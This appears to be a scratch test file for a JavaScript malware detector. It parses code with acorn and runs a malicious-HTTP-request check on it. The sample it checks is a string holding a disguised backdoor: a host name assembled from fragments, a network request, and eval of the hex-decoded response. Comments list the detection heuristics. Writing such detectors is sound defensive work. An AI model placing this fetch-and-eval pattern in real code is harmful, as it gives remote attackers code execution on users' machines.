import * as acorn from 'acorn'
import * as walk from 'acorn-walk'
import { intersection, map } from 'lodash';
import {foldConstant} from './src/ast-passes/string-const-folding'
// import {findEncodedString} from "./src/ast-passes/detect-encoded-string";
import { isMaliciousHttpRequest} from "./src/detect-malicious-request";
// const code = `
// var f = (x) => {
//     return "a"+x
// }
// var c = f(2)
// `

// eval/exec => dangerous function powerful api
// http.get && eval => backdoor
// http.get => possible network connection with 'url'
// ..... && string is encoded => highly possible backdoor with unknown encoded string


// const ast = acorn.parse(code, {ecmaVersion: "latest"}) as any
// console.log(foldConstant(ast))


const code = `
var e = Buffer.from(e, "hex").toString()
var url_part_1 = 'h' + 't' + 't' + 'p' // <--- disguised http keyword
var url_part_2 = ['api.github', '.com/repos'].join('')
var getAddress = url_part_1 + url_part_2;
https.get(
{ 
 hostname: getAddress,
 port: 8080,
 method: "POST",
 path: "/" + t,
  },
 r => {
 r.on("data", c => {
   c = Buffer.from(c, "hex").toString()
   eval(c);  // <--- malicious code here
   });
  }
)
`

// var url_part_1 = 'h' + 't' + 't' + 'p' // <--- disguised http keyword
// var url_part_2 = ['api.github', '.com/repos'].join('')
// var getAddress = url_part_1 + url_part_2;
// https.get(
//   getAddress,
//   r => {
//       r.on("data", c => {
//           eval(c);  // <--- malicious code here
//       });
//   }
// )



const ast = acorn.parse(code, {sourceType: "module", ecmaVersion: "latest"}) as any
// foldConstant(ast)
// findEncodedString(ast)

// walk.full(ast, node => {
//     console.log(node)
// })

isMaliciousHttpRequest(code)

// console.log(Buffer.from("SGVsbG8gV29ybGQ=").toString('base64'))
// console.log(Buffer.from("SGVsbG8gV29ybGQ=", 'base64'))
